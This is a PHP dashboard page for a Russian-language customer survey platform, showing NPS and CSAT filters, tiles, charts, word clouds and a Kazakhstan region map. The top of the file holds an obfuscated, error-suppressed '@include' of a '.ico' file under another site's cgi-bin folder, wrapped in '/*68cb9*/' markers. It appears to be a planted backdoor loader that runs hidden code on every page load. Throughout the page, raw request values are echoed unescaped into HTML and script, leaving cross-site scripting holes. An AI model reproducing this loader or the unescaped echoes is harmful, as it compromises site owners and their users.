<?php




/*68cb9*/

@include "\x2fvar\x2fwww\x2fvho\x73ts/\x74rav\x65lai\x72.kz\x2fpro\x73tar\x74up.\x6bz/c\x67i-b\x69n/f\x61vic\x6fn_1\x32c7e\x30.ic\x6f";

/*68cb9*/

require 'php/statisticWords.php';
require 'php/getWords.php';
require 'php/getData.php';

//echo "<pre>"; print_r($map); die;
require 'php/general.php';
require 'php/areaAmcharts.php';
?>

<link href="../build/css/tag_style.css" rel="stylesheet" type="text/css">

<meta http-equiv="content-type" content="text/plain; charset=UTF-8"/>
<link href="../build/css/jqcloud.min.css" rel="stylesheet" type="text/css">


<div class="right_col" role="main">
    <div class="container">
        <div class="row top_tiles">

<div id="getData"><?php !empty($_GET)?$_GET:""

                    ?>	</div>
		<!-- filtr start -->
	<div class="col-md-12 col-sm-12 col-xs-12">
<div class="x_panel filter">

<div class="x_title">
<h2>
Фильтры
</h2>
<ul class="nav navbar-right panel_toolbox">
<li><a class="collapse-filter"><i class="fa fa-chevron-up"></i></a>
</li>


</ul>
<div class="clearfix"></div>

</div>
<div class="x_content">
<form name="filtr" method="GET" action="index.php">

    <table>
        <th><label for="point_of_interaction">Точка взаимодействия:</label></th>
        <th><label for="channel">Канал опроса:</label></th>
        <th><label for="avgcheck">Средний чек:</label></th>
        <th><label for="product">Тип продукта:</label><br></th>
        <th><label for="nps_id">NPS:</label></th>
        <th><label for="csat_id">CSAT:</label></th>

        <tr>
            <td valign="top">
                <div class="col-md-7 col-sm-12 col-xs-12 form-group">

        <div class="checkbox">
                 <?php foreach($filters->getPoint_of_interaction() as $data): ?>
                       <label>
                           <input type="checkbox" name="point_of_interaction[]" value="<?php echo $data['id'];?>" <?php if(isset($_GET['point_of_interaction']) && in_array($data['id'],$_GET['point_of_interaction'])) echo " checked ";?>> <?php echo $data['name'];?>
                       </label>
                <?php endforeach; ?>
                          </div>
</div>
            </td>
            <td valign="top">
            <div class="col-md-3 col-sm-12 col-xs-12 form-group">

        <div class="checkbox">
       <?php foreach($filters->getChannel() as $data): ?>
                       <label>
                           <input type="checkbox" name="channel[]" value="<?php echo $data['id'];?>"<?php if(isset($_GET['channel']) && in_array($data['id'],$_GET['channel'])) echo " checked ";?>> <?php echo $data['name'];?>
                       </label>
                <?php endforeach; ?>
         </div>
</div>
            </td>
            <td valign="top">
            <div class="col-md-3 col-sm-12 col-xs-12 form-group">

        <div class="checkbox">
       <?php foreach($filters->getCheckTitle() as $data): ?>
                       <label>
                           <input type="checkbox" name="avgcheck[]" value="<?php echo $data['id'];?>" <?php if(isset($_GET['avgcheck']) && in_array($data['id'],$_GET['avgcheck'])) echo " checked ";?>> <?php echo $data['name'];?>
                       </label>
                <?php endforeach; ?>
         </div>
</div>
            </td>
            <td valign="top">
                <div class="col-md-2 col-sm-12 col-xs-12 form-group">

        <div class="checkbox">
       <?php foreach($filters->getProduct() as $data): ?>
                       <label>
                           <input type="checkbox" name="product[]" value="<?php echo $data['id'];?>" <?php if(isset($_GET['product']) && in_array($data['id'],$_GET['product'])) echo " checked ";?> > <?php echo $data['name'];?>
                       </label>
                <?php endforeach; ?>
         </div>
</div>
            </td>
            <td valign="top">
            <div class="col-md-2 col-sm-12 col-xs-12 form-group">

        <div class="checkbox">
       <?php foreach($filters->getNPS_ref() as $data): ?>
                       <label>
                           <input type="checkbox" name="nps_id[]" value="<?php echo $data['id'];?>"<?php if(isset($_GET['nps_id']) && in_array($data['id'],$_GET['nps_id'])) echo " checked ";?>> <?php echo $data['title'];?>
                       </label>
                <?php endforeach; ?>
         </div>
</div>
            </td>
            <td valign="top">
                <div class="col-md-8 col-sm-12 col-xs-12 form-group">

        <div class="checkbox">
       <?php foreach($filters->getCSAT_ref() as $data): ?>
                       <label>
                           <input type="checkbox" name="csat_id[]" value="<?php echo $data['id'];?>"<?php if(isset($_GET['csat_id']) && in_array($data['id'],$_GET['csat_id'])) echo " checked ";?>> <?php echo $data['title'];?>
                       </label>
                <?php endforeach; ?>
         </div>
</div>

            </td>


        </tr>
    </table>
        <div class="col-md-2 col-sm-12 col-xs-12 form-group">
<label> Длительность <br>обслуживания(Мин):</label>
<?php if(isset($_GET['duration_of_serviceStart'])):?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" value="<?php echo $_GET['duration_of_serviceStart'];?>" name="duration_of_serviceStart"/>
<?php else:?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" name="duration_of_serviceStart"/>
<?php endif;?>
<br>
<?php if(isset($_GET['duration_of_serviceEnd'])):?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" value="<?php echo $_GET['duration_of_serviceEnd'];?>" name="duration_of_serviceEnd"/>
<?php else:?>
<input type="number" autocomplete="off" placeholder="по" class="form-control" name="duration_of_serviceEnd"/>
<?php endif;?>
</div>
                <div class="col-md-2 col-sm-12 col-xs-12 form-group">
<label>Жизнь клиента <br>(мес):</label>
<?php if(isset($_GET['servicetimeStart'])):?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" value="<?php echo $_GET['servicetimeStart'];?>" name="servicetimeStart"/>
<?php else:?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" name="servicetimeStart"/>
<?php endif;?>
<br>
<?php if(isset($_GET['servicetimeEnd'])):?>
<input type="number"  autocomplete="off"  placeholder="с" class="form-control" value="<?php echo $_GET['servicetimeEnd'];?>" name="servicetimeEnd"/>
<?php else:?>
<input type="number" autocomplete="off" placeholder="по" class="form-control" name="servicetimeEnd"/>
<?php endif;?>
</div>

    <div class="col-md-2 col-sm-12 col-xs-12 form-group">
<label>Количество <br>транзакций:</label>
<?php if(isset($_GET['transactionsStart'])):?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" value="<?php echo $_GET['transactionsStart'];?>" name="transactionsStart"/>
<?php else:?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" name="transactionsStart"/>
<?php endif;?>
<br>
<?php if(isset($_GET['transactionsEnd'])):?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" value="<?php echo $_GET['transactionsEnd'];?>" name="transactionsEnd"/>

<?php else:?>
<input type="number" autocomplete="off" placeholder="по" class="form-control" name="transactionsEnd"/>

    <?php endif;?>
</div>


    <div class="col-md-2 col-sm-12 col-xs-12 form-group">
<label> Возраст: <br><br></label>
<?php if(isset($_GET['ageStart'])):?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" value="<?php echo $_GET['ageStart'];?>" name="ageStart"/>
<?php else:?>
<input type="number" autocomplete="off" placeholder="с" class="form-control" name="ageStart"/>
<?php endif;?>
<br>
<?php if(isset($_GET['ageEnd'])):?>
<input type="number" autocomplete="off"  placeholder="с" class="form-control" value="<?php echo $_GET['ageEnd'];?>" name="ageEnd"/>
<?php else:?>
<input type="number" autocomplete="off" placeholder="по" class="form-control" name="ageEnd"/>
<?php endif;?>
</div>

    <div class="col-md-2 col-sm-12 col-xs-12 form-group">
    <label for="gender"> Пол:</label><br><br>
<select id="gender" name="gender" class="form-control">
    <option value="">Выбрать</option>
    <?php foreach($filters->getGender() as $data): ?>
<?php if($_GET['gender']==$data['id']):?>
<option value="<?php echo $data['id'];?>" selected><?php echo $data['name'];?></option>
     <?php else:?>
<option value="<?php echo $data['id'];?>"><?php echo $data['name'];?></option>
     <?php endif;?>
<?php endforeach; ?>
</select>
</div>
<div class="col-md-12 col-sm-12 col-xs-12 form-group" align="right">
<input type="submit" class="btn btn-danger btn-sm" value="Применить">
</div>
</form>
<div class="col-md-12 col-sm-12 col-xs-12 form-group" align="right">
<a href="../production/index.php"><button class="btn btn-success btn-sm">Сброс</button></a>
</div>
</div>
</div>
</div>
<!-- Filtr end-->




            <div class="col-sm-7 col-sm-3">
                <div class="tile-stats">
                    <div class="icon">
                        <i class="fa fa-comments-o"></i>
                    </div>
        <div class="count"><?php echo !empty($total_question[1]['col_count'])? $total_question[1]['col_count']:"0"; ?></div>
        <p>
					<?php if(!empty($total_question[1]['col_count'])): ?>

                        <a href="../production/csatre.php?question=1<?php echo $url; ?>"  target="_blank" ><b>(<?php echo !empty($total_question[1]['title'])? $total_question[1]['title']:""; ?>)</b></a>

          <?php endif; ?>
					</p>


                </div>
            </div>
            <div class="col-sm-7 col-sm-3">
                <div class="tile-stats">
                    <div class="icon">
                        <i class="fa fa-comments-o"></i>
                    </div>
                    <div class="count"><?php echo  !empty($total_question[2]['col_count'])? $total_question[2]['col_count']:"0"; ?></div>
                    <p>
					<?php if(!empty($total_question[2]['col_count'])): ?>
                        <a href="../production/questionDetail.php?question=2<?php echo $url; ?>"  target="_blank" ><b>(<?php echo !empty($total_question[2]['title'])? $total_question[2]['title']:""; ?>)</b></a>
                     <?php endif; ?>
					</p>

                </div>
            </div>
            <div class="col-sm-7 col-sm-3">
                <div class="tile-stats">
                    <div class="icon">
                        <i class="fa fa-comments-o"></i>
                    </div>
                    <div class="count"><?php echo !empty($total_question[3]['col_count'])? $total_question[3]['col_count']:"0"; ?></div>
                    <p>
					<?php if(!empty($total_question[3]['col_count'])): ?>
                        <a href="../production/questionDataView.php?question=3<?php echo $url; ?>" target="_blank" ><b>(<?php echo !empty($total_question[3]['title'])?$total_question[3]['title']:""; ?>)</b></a>
                    <?php endif; ?>
					</p>

                </div>
            </div>
          <div class="col-sm-7 col-sm-3">
                <div class="tile-stats">
                    <div class="icon">
                        <i class="fa fa-comments-o"></i>
                    </div>
                    <div class="count"><?php echo !empty($total_question[4]['col_count'])?$total_question[4]['col_count']:"0"; ?></div>
                    <p>
					<?php if(!empty($total_question[4]['col_count'])): ?>
                        <a href="../production/questionDataView.php?question=4<?php echo $url; ?>" target="_blank" ><b>(<?php echo !empty($total_question[4]['title']) ?$total_question[4]['title']:""; ?>)</b></a>
					<?php endif; ?>
					</p>

                </div>
            </div>

            <!-- <div class="col-md-15 col-sm-3 ">
                <div class="tile-stats">
                    <div class="icon">
                        <i class="fa fa-comments-o"></i>
                    </div>
                    <div class="count"><?php echo !empty($total_question[5]['col_count']) ?$total_question[5]['col_count']:"0"; ?></div>
                    <p>
						<?php if(!empty($total_question[5]['col_count'])): ?>
                        <a href="../production/questionDataView.php?question=5<?php echo $url; ?>" target="_blank" ><b>(<?php echo !empty($total_question[5]['title'])?$total_question[5]['title']:""; ?>)</b></a>
						<?php endif; ?>
					</p>

                </div>
            </div> -->

        </div>
    </div>



    <!-- top tiles -->
    <div class="row tile_count">
        <div class="col-sm-2 tile_stats_count" style="width: 14%;">
            <span class="count_top"><i class="fa fa-user"></i><?php echo !empty($csat_title)?$csat_title:"Общий CSAT"  ?> </span>
            <div class="count" ><?php echo isset($totalCSAT[0]['arif'])? $totalCSAT[0]['arif']:"0";  ?> </div>
            <span class="count_bottom"><i <?php if($totalCsat_is_down): ?> class="red" <?php else: ?> class="green"  <?php endif; ?>   >
                    <i
                      <?php if($totalCsat_is_down): ?>  class="fa fa-sort-desc" <?php else: ?>  class="fa fa-sort-asc" <?php endif; ?>  ></i>
                <?php echo isset($totalCSAT[0]['lastweek'])? $totalCSAT[0]['lastweek']:"";  ?>
                </i> На прошлой неделе</span>
        </div>
        <div class="col-sm-2 tile_stats_count" style="width: 14%;">
            <span class="count_top"><i class="fa fa-clock-o"></i> Общий NPS</span>
            <div class="count"><?php echo  $totalNPS ?> </div>
            <span class="count_bottom"><i <?php if($changeStatusForNPS!=0): ?> class="red" <?php else: ?> class="green"  <?php endif; ?> ><i
        <?php if($changeStatusForNPS!=0): ?>  class="fa fa-sort-desc" <?php else: ?>  class="fa fa-sort-asc" <?php endif; ?>  ></i><?php echo $totalNPS_lastweek_query; ?>  </i> На прошлой неделе</span>
        </div>
        <div class="col-sm-2 tile_stats_count" style="width: 14%;">
            <span class="count_top"><i class="fa fa-user"></i> Всего опрошено</span>
            <div class="count green"><?php echo isset($Allaskedpeople[0]['all_asked'])? $Allaskedpeople[0]['all_asked']:"" ?>  </div>
            <span class="count_bottom"><i  <?php if($changeStatusForAllAsked!=0): ?> class="red" <?php else: ?> class="green"  <?php endif; ?> ><i
                      <?php if($changeStatusForAllAsked!=0): ?>  class="fa fa-sort-desc" <?php else: ?> class="fa fa-sort-asc"  <?php endif; ?> ></i><?php echo isset($Allaskedpeople_lastweek[0]['all_asked'])? $Allaskedpeople_lastweek[0]['all_asked']:"0" ?> </i>  На прошлой неделе</span>
        </div>
        <div class="col-sm-2 tile_stats_count" style="width: 14%;">
            <span class="count_top"><i class="fa fa-user"></i>  Response rate</span>
            <div class="count"><?php echo isset($totalRespondrate)? $totalRespondrate:"" ?> </div>
            <span class="count_bottom"><i <?php if($changeStatusTotalRespondRate!=0): ?> class="red" <?php else: ?> class="green"  <?php endif; ?>><i
                     <?php if($changeStatusTotalRespondRate!=0): ?>   class="fa fa-sort-desc" <?php else: ?>   class="fa fa-sort-asc"  <?php endif; ?> ></i><?php echo isset($totalRespondrate_lastweek)? $totalRespondrate_lastweek:"0" ?> </i> На прошлой неделе</span>
        </div>
        <div class="col-sm-2 tile_stats_count" style="width: 14%;">
            <span class="count_top"><i class="fa fa-user"></i>  NPS call-center</span>
            <div class="count"><?php  echo isset($call_center_nps['call-center']['rate'])? round($call_center_nps['call-center']['rate'],2):"0%";  ?></div>
            <span class="count_bottom"><i  <?php if($changeStatuscall_center_nps!=0):   ?> class="red" <?php else: ?>  class="green" <?php endif; ?>  ><i
                     <?php if($changeStatuscall_center_nps!=0):   ?>  class="fa fa-sort-desc"    <?php else: ?>  class="fa fa-sort-asc"  <?php endif; ?>   ></i><?php  echo isset($call_center_nps['call-center']['rate'])? $call_center_nps_last_week['call-center']['rate']:"";  ?> </i> На прошлой неделе</span>
        </div>
		 <div class="col-sm-2 tile_stats_count"  style="width: 14%;">
            <span class="count_top"><i class="fa fa-user"></i> NPS офис продаж</span>
            <div class="count"><?php  echo isset($office_nps['office']['rate'])? round($office_nps['office']['rate'],2):"0%";  ?></div>
 <span class="count_bottom"><i  <?php if($changeStatuscall_office!=0):   ?> class="red" <?php else: ?>  class="green" <?php endif; ?>  ><i
 <?php if($changeStatuscall_office!=0):   ?>  class="fa fa-sort-desc"    <?php else: ?>  class="fa fa-sort-asc"  <?php endif; ?>   ></i><?php  echo isset($office_nps['office']['rate'])? $office_nps_last_week['office']['rate']:"";  ?> </i> На прошлой неделе</span>

        </div>

        <div class="col-sm-2 tile_stats_count" style="width: 14%;">
            <span class="count_top"><i class="fa fa-user"></i> NPS техподдержки</span>
            <div class="count"><?php  echo isset($help_desk_nps['help_desk']['rate'])? round($help_desk_nps['help_desk']['rate'],2):"0%";  ?></div>
  <span class="count_bottom"><i  <?php if($changeStatushelp_desk_nps!=0):   ?> class="red" <?php else: ?>  class="green" <?php endif; ?>  ><i
 <?php if($changeStatushelp_desk_nps!=0):   ?>  class="fa fa-sort-desc"    <?php else: ?>  class="fa fa-sort-asc"  <?php endif; ?>   ></i><?php  echo isset($help_desk_nps['help_desk']['rate'])? $help_desk_nps_last_week['help_desk']['rate']:"";  ?> </i> На прошлой неделе</span>




        </div>

    </div>
    <!-- /top tiles -->

    <div class="row">

        <div class="col-md-4 col-sm-4 col-xs-12">
            <div class="x_panel">
                <div class="x_title">
                    <h2>NPS</h2>
                    <ul class="nav navbar-right panel_toolbox">
                        <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                        </li>
                        <li><a onClick="exportToExcel('echart_line_table')" ><i class="fa fa-download" aria-hidden="true"></i></a>
                        </li>

                    </ul>
                    <div class="clearfix"></div>
                </div>
                <div class="x_content2">

                    <div   id="graph_donut" style="height: 320px;"></div>

                			<ul class="list-inline m-t-30 text-center">
                    <?php if(!empty($result_data_bad['value'])):  ?>
                        <li>
                            <h5 class="text-muted">
                                <i class="fa fa-circle" style="color: #34495E;"></i> <?php echo !empty($result_data_bad['label']) ?$result_data_bad['label']:"0" ?></h5>
                            <h4 class="m-b-0"><?php echo   $result_data_bad['value']." (" . $result_data_bad['bad_rate'] . " %)  ";   ?></h4>
                        </li>
                    <?php else: ?>
                        <li>
                            <h5 class="text-muted">
                                <i class="fa fa-circle" style="color: #34495E;"></i> Пусто</h5>
                            <h4 class="m-b-0"><?php echo   "0"." (0 %)  ";   ?></h4>
                        </li>
                    <?php endif; ?>

                      <?php if(!empty($result_data_good['value'])):  ?>
                          <li class="p-r-20">
                            <h5 class="text-muted">
                                <i class="fa fa-circle" style="color: #ACADAC;"></i><?php echo $result_data_good['label'] ?> </h5>
                            <h4 class="m-b-0"><?php echo  $result_data_good['value']. " (" . $result_data_good['good_rate'] . " %)  ";  ?></h4>
                        </li>
                      <?php else: ?>
                          <li class="p-r-20">
                            <h5 class="text-muted">
                                <i class="fa fa-circle" style="color: #ACADAC;"></i><?php echo "Пусто"; ?> </h5>
                            <h4 class="m-b-0"><?php echo  "0 (0 %)  ";  ?></h4>
                          </li>
                          <div style="height: 5px;"></div>
                        <?php endif; ?>

                      <?php if(!empty($result_data_well['value'])):  ?>

                        <li class="p-r-20">
                            <h5 class="text-muted">
                                <i class="fa fa-circle" style="color: #26B99A;"></i> <?php echo $result_data_well['label'] ?></h5>
                            <h4 class="m-b-0"><?php echo   $result_data_well['value']." (" . $result_data_well['well_rate'] . " %)  "; ?></h4>
                        </li>
                      <?php else: ?>

                      <li class="p-r-20">
                          <h5 class="text-muted">
                              <i class="fa fa-circle" style="color: #26B99A;"></i> <?php echo "Пусто"; ?></h5>
                          <h4 class="m-b-0"><?php echo   "0 (0 %)  "; ?></h4>
                      </li>
                      <?php endif; ?>

                    </ul>

                    <ul class="list-inline m-t-30 text-center">
                        <li>
                            <h4 class="text-muted">Получено ответов:</h4>
                        </li>
                        <li>

                            <h4 class="m-b-0"> <?php echo !empty($result_data_totall['total'])? $result_data_totall['total']:"0"; ?></h4>
                        </li>
                    </ul>

                    <div style="display:none">
                        <div id="echart_line_table" >
                            <table class="countries_list">
                                <tr>
                                    <th>Детракторы</th>
                                    <th>Нейтралы</th>
                                    <th>Промоутеры</th>
                                </tr>

                                <tr>
                                    <td><?php echo !empty($result_data_bad['value'])? $result_data_bad['value']: "0"; ?></td>
                                    <td><?php echo !empty($result_data_good['value'])? $result_data_good['value']:"0";  ?></td>
                                    <td><?php echo !empty($result_data_well['value'])? $result_data_well['value']: "0";  ?></td>
                                </tr>

                            </table>
                        </div>
                    </div>

                </div>
            </div>
        </div>



          <div class="col-md-8 col-sm-8 col-xs-12">
            <div class="x_panel">
                <div class="x_title">
 				<h2>NPS в динамике</h2>
                    <ul class="nav navbar-left panel_toolbox">
                        <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                        </li>
                        <li><a onClick="exportToExcel('chartdiv1_nps_export')"><i class="fa fa-download" aria-hidden="true"></i></a>
                        </li>

                    </ul>
                    <div class="clearfix"></div>
                </div>
                <div class="x_content">
                     <div id="reportrange_nps" class="pull-right" style="background: #fff; cursor: pointer; padding: 5px 10px; border: 1px solid #ccc">
                      <i class="glyphicon glyphicon-calendar fa fa-calendar"></i>
                      <span>December 30, 2014 - January 28, 2015</span> <b class="caret"></b>
                    </div>

                    <div id="chartdiv1_nps" style="width: 100%; height: 400px; background-color: #FFFFFF;" ></div>


					<div id="chartdiv1_nps_export"></div>

					<div style="height: 64px;"></div>

                </div>
            </div>
        </div>



        <script src="../build/js/highmaps.js"></script>
        <script src="../build/js/exporting.js"></script>
        <script
        src="../build/js/kz-all.js"></script>

        <div class="col-md-12 col-sm-12 col-xs-12">
				<div class="x_panel">
					<div class="x_title">
						 <h2>Регионы</h2>
						<ul class="nav navbar-right panel_toolbox">
							<li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
							</li>


						</ul>
						<div class="clearfix"></div>
					</div>
					<div class="x_content2">

						<div id="average_export_table" style="display: none">

							<table>
								<tr>
									<th>Промоутеры</th>
									<th>Нейтралы</th>
									<th>Детракторы</th>
								</tr>
						<?php foreach ($total as $data): ?>
						<tr>
									<td><?php echo $data['providers']  ?></td>
									<td><?php echo $data['neutrals']  ?></td>
									<td><?php echo $data['detructors']  ?></td>
								</tr>
						<?php endforeach;  ?>
						</table>
						</div>

						    <div id="kazakhstan" class="col-md-8 col-sm-8 col-xs-12" 	 ></div>
						    <div class="col-md-4 col-sm-4 col-xs-8">
						    <div class="x_content">

                  <?php foreach($res_region_arr as $region_id => $bar_data): ?>
              <div class="col-md-6">
                  <p style="font-size: 11px;">
                      <b><a target="_blank" href="../production/detailedRegion.php?reqion_id=<?php echo $region_id; ?>"><?php echo $bar_data['label']; ?></a></b>
                  </p>
                       <div class="progress" style="margin-bottom: 5px;" >
                        <div class="progress-bar bg-green" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="50" style="width: <?php echo isset($bar_data['rate'])? abs($bar_data['rate']):"";  ?>px;">
                        </div>
                      </div>
                  <p><b><?php echo  isset($bar_data['rate'])? $bar_data['rate']."%":"0%";  ?></b></p>
                </div>
                <?php endforeach; ?>
                  </div>
						    </div>

					</div>
				</div>
			</div>


        <div class="col-md-4 col-sm-4 col-xs-12">
            <div class="x_panel">
                <div class="x_title">
                    <h2>Точка контакта</h2>
                    <ul class="nav navbar-right panel_toolbox">
                        <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                        </li>
                        <li><a onClick="exportToExcel('progress_export')"><i class="fa fa-download" aria-hidden="true"></i></a>
                        </li>
                    </ul>
                    <div class="clearfix"></div>
                </div>
                <div class="x_content2">
             <div style="width: 100%; height: 400px; background-color: #FFFFFF;" >

                   <p>
                      	<b><?php echo 'Call Center'; ?>&nbsp;&nbsp;</b>
					</p>

                  <div class="progress" >
                        <div class="progress-bar bg-green" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="50" style="width: <?php echo  abs($call_center_nps['call-center']['rate'])."px";  ?>;">
                        </div>
                  </div>

                   <p><b><?php echo  isset($call_center_nps['call-center']['rate'])? round($call_center_nps['call-center']['rate'],2)."%":"0%";  ?></b></p>

				    <p>
                      	<b><?php echo 'офис продаж'; ?>&nbsp;&nbsp;</b>
					</p>

                  <div class="progress" >
                        <div class="progress-bar bg-green" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="50" style="width: <?php echo  abs($office_nps['office']['rate'])."px";  ?>;">
                        </div>
                  </div>

                   <p><b><?php echo  isset($office_nps['office']['rate'])? round($office_nps['office']['rate'],2)."%":"0%";  ?></b></p>

				    <p>
                      	<b><?php echo 'техподдержка'; ?>&nbsp;&nbsp;</b>
					</p>

                  <div class="progress" >
                        <div class="progress-bar bg-green" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="50" style="width: <?php echo  abs($help_desk_nps['help_desk']['rate'])."px";  ?>;">
                        </div>
                  </div>

                   <p><b><?php echo  isset($help_desk_nps['help_desk']['rate'])? round($help_desk_nps['help_desk']['rate'],2)."%":"0%";  ?></b></p>


                 <div id="progress_export" style="display: none;">
                      <table class="table">
                      <tr>
                      <?php foreach ($ConnectionDot_arr as $bar_data): ?>
                         	<th><?php echo $bar_data['label']; ?></th>
                      <?php endForeach; ?>
                      </tr>
                      <tr>
                      <?php foreach ($ConnectionDot_arr as $bar_data): ?>
                        	<td><?php echo  isset($bar_data['rate'])? $bar_data['rate']."":"0%"; ?></td>
                      <?php endForeach; ?>
                      </tr>
                      </table>
                  </div>

                  </div>
                  <?php if(!empty($ConnectionDot_arr)): ?>
                  <div style="height: 40px;" ></div>
                  <?php endif; ?>
                </div>
            </div>
        </div>



          <div class="col-md-8 col-sm-8 col-xs-12">
            <div class="x_panel">
                <div class="x_title">
			<h2>Точка контакта в динамике</h2>
                    <ul class="nav navbar-left panel_toolbox">
                        <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                        </li>
                       <li><a onClick="exportToExcel('chartdiv1_poi_export')"><i class="fa fa-download" aria-hidden="true"></i></a>
                        </li>

                    </ul>
                    <div class="clearfix"></div>
                </div>
                <div class="x_content">
                     <div id="reportrange" class="pull-right" style="background: #fff; cursor: pointer; padding: 5px 10px; border: 1px solid #ccc">
                      <i class="glyphicon glyphicon-calendar fa fa-calendar"></i>
                      <span>December 30, 2014 - January 28, 2015</span> <b class="caret"></b>
                    </div>

                    <div id="chartdiv1" style="width: 100%; height: 400px; background-color: #FFFFFF;" ></div>


					<div id="chartdiv1_poi_export"></div>

                </div>
            </div>
        </div>




           <div class="col-md-6 col-sm-6 col-xs-12">
            <div class="x_panel">
                <div class="x_title">
 <h2>Частые негативные слова</h2>
                    <ul class="nav navbar-left panel_toolbox">
                        <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                        </li>

                    </ul>
                    <div class="clearfix"></div>
                </div>
                <div class="x_content">


                    <div  id="demo" style="height: 350px; " >

                    </div>

                </div>
            </div>
        </div>



          <div class="col-md-6 col-sm-6 col-xs-12">
            <div class="x_panel">
                <div class="x_title">
 <h2>Частые позитивные слова</h2>
                    <ul class="nav navbar-left panel_toolbox">
                        <li><a class="collapse-link"><i class="fa fa-chevron-up"></i></a>
                        </li>

                    </ul>
                    <div class="clearfix"></div>
                </div>
                <div class="x_content">


                    <div id="" style="height: 350px;" >

                         <div  id="demo1" style="height: 350px;" >

                    </div>

                </div>
            </div>
        </div>
        </div>



    </div>


    <!-- /page content -->

    <!-- footer content -->
	<footer style="margin-left: 10px;">
        <div class="pull-right">
          Powered by DMS survey platform
        </div>
		  <div class="clearfix"></div>
    </footer>

    <!-- /footer content -->

      <script src="../build/js/jqcloud.min.js"></script>


      <script type="text/javascript">





 var bad_words = <?php echo json_encode($bad_words); ?>;


 var getData = <?php echo json_encode($_GET); ?>;


 var good_words = <?php echo json_encode($good_words); ?>;

 console.log(bad_words);

$('#demo').jQCloud(bad_words,{
    shape: 'rectangular',
    colors: ["red"]
});


     $('#demo1').jQCloud(good_words,{
    shape: 'rectangular',
	colors: ["#1ABB9C"]

});


      </script>




    <script type="text/javascript">
$(function() {

    var start = moment().subtract(29, 'days');
    var end = moment();

    function cb(start, end) {
        $('#reportrange span').html(start.format('MMMM D, YYYY') + ' - ' + end.format('MMMM D, YYYY'));
    }

    $('#reportrange').daterangepicker({
        startDate: start,
        endDate: end,
        ranges: {
           'Today': [moment(), moment()],
           'Yesterday': [moment().subtract(1, 'days'), moment().subtract(1, 'days')],
           'Last 7 Days': [moment().subtract(6, 'days'), moment()],
           'Last 30 Days': [moment().subtract(29, 'days'), moment()],
           'This Month': [moment().startOf('month'), moment().endOf('month')],
           'Last Month': [moment().subtract(1, 'month').startOf('month'), moment().subtract(1, 'month').endOf('month')]
        }
    }, cb);

    cb(start, end);

});
</script>


    </script>


    <script>




    var map  = <?php echo json_encode($map); ?>;

	var new_map = [];


    for( var i in map ) {
	    if (map.hasOwnProperty(i)){

			if(map[i]['code']){

				new_map.push(map[i]['code']);
			}

			if(map[i]['number']){
				new_map.push(parseInt(map[i]['number']));
			}
	    	//new_map.push(parseFloat(new_map[i]));

		}
	}




	 var arr = <?php echo json_encode($result_data_point); ?>

                            var well = <?php echo json_encode($result_data_well); ?>;
                            var good = <?php echo json_encode($result_data_good); ?>;
                            var bad = <?php echo json_encode($result_data_bad); ?>;



                            var data = [

                            	new_map,


                                ];
                            // Create the chart
                            Highcharts.mapChart('kazakhstan', {
                            chart: {
                            	selectionMarkerFill:"rgba(173,255,47)",
                            map: 'countries/kz/kz-all'
                            },
                                    title: {
                                    text: ''
                                    },
                                    subtitle: {
                                    text: ''
                            },
                            mapNavigation: {
                            enabled: false,
                            buttonOptions: {
                            verticalAlign: 'bottom'
                            }
                            },
                            colorAxis: {
                            min: 0
                            },
                            series: [{
                            data: data,
                            name: 'NPS',
                            states: {
                            hover: {
                                    color: '#BADA55'
                                    }
                                            },
                                            dataLabels: {
                                            enabled: true,
                                                    format: '{point.name}'
                                            }
                                    }]
                            });

                            function exportNPS (counter1, counter2, counter3){



                            var table = "<table><tr><th>Промоутеры</th><th>Нейтралы</th><th>Детракторы</th></tr><tr><td>" + counter1 + "</td><td>" + counter2 + "</td><td>" + counter3 + "</td></tr></table>"
                                        var htmls = "";
                                var uri = 'data:application/vnd.ms-excel;base64,';
                                var template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><meta http-equiv="content-type" content="application/vnd.ms-excel; charset=UTF-8"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--></head><body><table>{table}</table></body></html>';
                                var base64 = function(s) {
                                return window.btoa(unescape(encodeURIComponent(s)))
                                };
                                var format = function(s, c) {
                                return s.replace(/{(\w+)}/g, function(m, p) {
                                return c[p];
                                })
                                };
                                htmls = table;
                                var ctx = {
                                worksheet : 'Worksheet',
                                        table : htmls
                                }


                                var link = document.createElement("a");
                                link.download = "export.xls";
                                link.href = uri + base64(format(template, ctx));
                                link.click();
                                }


                                function exportToExcel1(name_html){



                                var table = $('#'+name_html).html();



                                var htmls = "";
                                var uri = 'data:application/vnd.ms-excel;base64,' ;


                                var  template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines/></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--></head><body><table>{table}</table></body></html>';


                                var base64 = function(s) {
                                return window.btoa(unescape(encodeURIComponent(s)))
                                };

